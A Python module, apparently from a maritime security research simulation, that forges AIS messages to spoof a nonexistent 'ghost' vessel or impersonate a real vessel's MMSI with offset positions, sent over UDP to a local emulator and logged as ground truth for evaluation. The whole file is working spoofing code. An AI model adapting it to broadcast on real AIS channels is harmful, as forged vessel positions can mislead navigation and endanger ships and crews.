"""
AIS spoofing/injection module.

Unlike GPS spoofing, this does NOT need to intercept/modify any real
protocol -- AIS in this project is broadcast-only (nothing consumes it
for navigation), so the attack is simply crafting and broadcasting valid
AIVDM sentences onto the same UDP channel the WO-02 emulator uses. This
is exactly what a real AIS spoofing attack looks like: an attacker with
a radio transmitter broadcasting fabricated messages that any receiver
in range will decode as legitimate, because AIS has no message-level
authentication.

Requires: pip install pyais (same library WO-02 already used)

Two modes:
  ghost   - broadcasts a fully fabricated vessel that doesn't exist
  impersonate - broadcasts forged position under the REAL vessel's own
                MMSI, conflicting with its genuine reports
"""

import socket
import time
import threading
import math
import csv
import os
from pyais.encode import encode_dict

# --- Config --------------------------------------------------------------

AIS_BROADCAST_ADDR = ("127.0.0.1", 10110)  # same port WO-02's emulator uses

REAL_VESSEL_MMSI = 123456789   # matches WO-02's configured MMSI -- confirm
                                 # this is still correct before running

# Approximate area to place the ghost vessel / impersonation drift around,
# based on the sydney_regatta home coordinates used throughout this project.
HOME_LAT = -33.724223
HOME_LON = 150.679736

ATTACK_LOG_PATH = os.path.expanduser("~/Maritime-sim/attack_logs/ais_spoof_ground_truth.csv")

# --- Ground truth logging (private) ---------------------------------------

os.makedirs(os.path.dirname(ATTACK_LOG_PATH), exist_ok=True)
_log_lock = threading.Lock()


def log_attack_event(wall_ts, attack_type, mmsi_used, lat, lon, note):
    with _log_lock:
        write_header = not os.path.exists(ATTACK_LOG_PATH)
        with open(ATTACK_LOG_PATH, "a", newline="") as f:
            w = csv.writer(f)
            if write_header:
                w.writerow(["wall_ts", "attack_type", "mmsi_used", "lat", "lon", "note"])
            w.writerow([wall_ts, attack_type, mmsi_used, lat, lon, note])


# --- AIS message construction ---------------------------------------------

def broadcast_ais_position(sock, mmsi, lat, lon, sog_knots, cog_deg):
    """Encodes and sends a Type 1 (position report) AIVDM sentence."""
    data = {
        "type": 1,
        "mmsi": mmsi,
        "lat": lat,
        "lon": lon,
        "speed": sog_knots,
        "course": cog_deg,
        "status": 0,  # under way using engine
    }
    sentences = encode_dict(data)
    for s in sentences:
        sock.sendto((s + "\r\n").encode("ascii"), AIS_BROADCAST_ADDR)


def broadcast_ais_static(sock, mmsi, vessel_name, destination="UNKNOWN"):
    """Encodes and sends a Type 5 (static/voyage data) AIVDM sentence."""
    data = {
        "type": 5,
        "mmsi": mmsi,
        "shipname": vessel_name,
        "destination": destination,
        "ship_type": 37,  # pleasure craft, arbitrary
    }
    sentences = encode_dict(data)
    for s in sentences:
        sock.sendto((s + "\r\n").encode("ascii"), AIS_BROADCAST_ADDR)


# --- Attack modes ----------------------------------------------------------

def run_ghost_vessel(sock, stop_event, ghost_mmsi=999999001, interval_s=5.0):
    """Broadcasts a fully fabricated vessel that doesn't exist in the
    simulation at all. Position drifts slowly near the home area to look
    plausible on a chart."""
    print(f"Ghost vessel MMSI {ghost_mmsi} broadcasting every {interval_s}s...")
    t0 = time.time()
    broadcast_ais_static(sock, ghost_mmsi, "PHANTOM", "NOWHERE")
    while not stop_event.is_set():
        elapsed = time.time() - t0
        # slow fake drift, arbitrary plausible-looking track
        lat = HOME_LAT + 0.001 * math.sin(elapsed / 60.0)
        lon = HOME_LON + 0.001 + 0.0005 * elapsed / 60.0
        broadcast_ais_position(sock, ghost_mmsi, lat, lon, sog_knots=4.0, cog_deg=270.0)
        log_attack_event(time.time(), "ghost", ghost_mmsi, lat, lon, "fabricated vessel")
        stop_event.wait(interval_s)


def run_impersonation(sock, stop_event, real_position_fn, offset_m=200.0,
                       bearing_deg=45.0, interval_s=2.0):
    """Broadcasts forged position under the REAL vessel's own MMSI, at a
    higher rate than a real vessel normally would, to try to dominate/
    conflict with its genuine reports.

    real_position_fn: a callable returning (lat, lon) for the real
    vessel's current true position -- if you have a live feed (e.g. from
    the dashboard's GPS subscription), pass a function that reads it.
    If not available, this falls back to a fixed approximate position.
    """
    print(f"Impersonating MMSI {REAL_VESSEL_MMSI} with +{offset_m}m offset, "
          f"broadcasting every {interval_s}s...")
    while not stop_event.is_set():
        try:
            true_lat, true_lon = real_position_fn()
        except Exception:
            true_lat, true_lon = HOME_LAT, HOME_LON

        bearing_rad = math.radians(bearing_deg)
        dlat = (offset_m * math.cos(bearing_rad)) / 111320.0
        dlon = (offset_m * math.sin(bearing_rad)) / (111320.0 * math.cos(math.radians(true_lat)))
        forged_lat = true_lat + dlat
        forged_lon = true_lon + dlon

        broadcast_ais_position(sock, REAL_VESSEL_MMSI, forged_lat, forged_lon,
                                sog_knots=6.0, cog_deg=bearing_deg)
        log_attack_event(time.time(), "impersonate", REAL_VESSEL_MMSI,
                          forged_lat, forged_lon, f"true=({true_lat:.6f},{true_lon:.6f})")
        stop_event.wait(interval_s)


# --- Interactive control ---------------------------------------------------

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    stop_event = threading.Event()
    active_thread = None

    def fixed_position_fallback():
        # Placeholder -- replace with a real live GPS read if available
        # (e.g. subscribe to the same /wamv/sensors/gps/gps/fix topic the
        # dashboard uses). Using a fixed point means the impersonation
        # offset won't track real vessel movement -- fine for an initial
        # test, but note this limitation when reporting results.
        return HOME_LAT, HOME_LON

    print("Commands: 'ghost' | 'impersonate' | 'off' | 'quit'")
    while True:
        cmd = input("> ").strip().lower()
        if active_thread and active_thread.is_alive():
            stop_event.set()
            active_thread.join(timeout=2)
        stop_event = threading.Event()

        if cmd == "ghost":
            active_thread = threading.Thread(
                target=run_ghost_vessel, args=(sock, stop_event), daemon=True)
            active_thread.start()
        elif cmd == "impersonate":
            active_thread = threading.Thread(
                target=run_impersonation,
                args=(sock, stop_event, fixed_position_fallback), daemon=True)
            active_thread.start()
        elif cmd == "off":
            print("Attack stopped.")
        elif cmd == "quit":
            os._exit(0)
        else:
            print("Unknown command. Use: ghost | impersonate | off | quit")


if __name__ == "__main__":
    main()
